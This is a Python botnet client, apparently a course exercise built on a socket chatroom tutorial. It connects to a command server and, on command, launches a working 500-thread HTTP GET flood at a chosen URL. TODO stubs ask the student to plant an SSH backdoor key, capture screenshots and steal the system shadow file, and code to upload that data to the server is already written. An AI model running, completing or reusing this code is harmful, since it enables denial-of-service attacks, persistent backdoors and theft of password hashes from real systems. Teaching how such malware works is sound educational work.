# base code sourced from: https://pythonprogramming.net/client-chatroom-sockets-tutorial-python-3/?completed=/server-chatroom-sockets-tutorial-python-3/ modifications applied

import socket
import errno
import sys
import uuid
import threading
import requests
import io
import random
import pyautogui

HEADER_LENGTH = 20
DATA_BUFFER = 4096
NODATA = 0
SHADOWFILE = 1
SCREENSHOT = 2

IP = str(sys.argv[1]) 
PORT = int(sys.argv[2]) 

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP, PORT))
client_socket.setblocking(False)

uid = str(uuid.uuid4()).encode('utf-8')
uid_header = f"{len(uid):<{HEADER_LENGTH}}".encode('utf-8')
client_socket.send(uid_header + uid)

stop_attack = False
threads = []

def initHeaders():
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': 'http://www.google.com/?q=abcdemghjk',
        'Keep-Alive': str(random.randint(110,120)),
        'Connection': 'keep-alive'
    }
    return headers

def sendGet(url):
    headers = initHeaders()
    try:
        request = requests.get(url, headers=headers, timeout=1)
    except:
        pass

class SendGETThread(threading.Thread):
    def run(self):
        try:
            while True:
                global url
                sendGet(url)
                if stop_attack:
                    break
        except:
            pass

def replyToServer(message, sendingData=NODATA):
	try:
		if message and sendingData != NODATA:
			data_len = len(message)
			header = ""
			if sendingData == SHADOWFILE:
				header = "shadow " + str(data_len)
			elif sendingData == SCREENSHOT:
				header = "screenshot " + str(data_len)
			message_header = f"{header:<{HEADER_LENGTH}}".encode('utf-8')
			client_socket.setblocking(True)
			client_socket.send(message_header)

			start = 0
			end = DATA_BUFFER
			while start < data_len:
				if end > data_len:
					client_socket.send(message[start:])
				else:
					client_socket.send(message[start:end])
				start += DATA_BUFFER
				end += DATA_BUFFER
			client_socket.setblocking(False)

		elif message:
			message = message.encode('utf-8')
			message_header = f"{len(message):<{HEADER_LENGTH}}".encode('utf-8')
			client_socket.send(message_header + message)

	except Exception as e:
		print("Error: {}".format(str(e)))
		return False

while True:
	# continuously wait for server to issue a command
	try:
		while True:
			cmd_header = client_socket.recv(HEADER_LENGTH)
			if not len(cmd_header):
				print('Connection closed by the bot server')
				sys.exit()
			cmd_length = int(cmd_header.decode('utf-8').strip())
			cmd = client_socket.recv(cmd_length).decode('utf-8')
			print("Recieved command {} from server".format(cmd))

			if cmd == "ping":
				replyToServer("pong")

			if cmd == "stop":
				if threads != []:
					stop_attack = True
					for t in threads:
						t.join()
					replyToServer("attacking stopped")
					threads = []
					stop_attack = False
				else:
					replyToServer("bots are not attacking")

			info = cmd.split()
			if len(info) == 2 and info[0] == "ddos":
				global url
				url = info[1]
				for i in range(500):
				    t = SendGETThread()
				    threads.append(t)
				    t.start()

			if info[0] == "ssh":
				if(len(info) == 1):
					replyToServer("SSH public key is needed")
				ssh_key = ""
				for i in range(1, len(info)):
					ssh_key = ssh_key + info[i] + " "

				## TODO(client side): append the ssh key to _you_should_know_which file
				##                    so that the server has a backdoor to ssh in
				## ---------------------------------
				## your code goes here
				## ---------------------------------
				
				replyToServer("SSH has set up")

			if cmd == "screenshot":
    			## TODO: take a screenshot and transfer it back to the server
				## Requirement: this should be done in memory without saving the screenshot as a file
				## ---------------------------------
				## your code goes here
				## hint: aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMzMxMDE5MzUvY29udmVydC1waWwtaW1hZ2UtdG8tYnl0ZS1hcnJheQ==
				image_size = len('')
				## ---------------------------------

				if image_size == 0:
					replyToServer("Failed to take a screenshot")
				else:
					replyToServer('', SCREENSHOT)

			if cmd == "shadow":
    			## TODO: find the shadow file in the system and send it back to the server
				## ---------------------------------
				## your code goes here
				file_data = ''
				## ---------------------------------

				file_size = len(file_data)
				if file_size == 0:
					replyToServer("Failed to transfrt shadow file")
				else:
					replyToServer(file_data, SHADOWFILE)

	except IOError as e:
		if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
			print('Reading error: {}'.format(str(e)))
			sys.exit()
		continue

	except Exception as e:
		print('Reading error: {}'.format(str(e)))
		sys.exit()
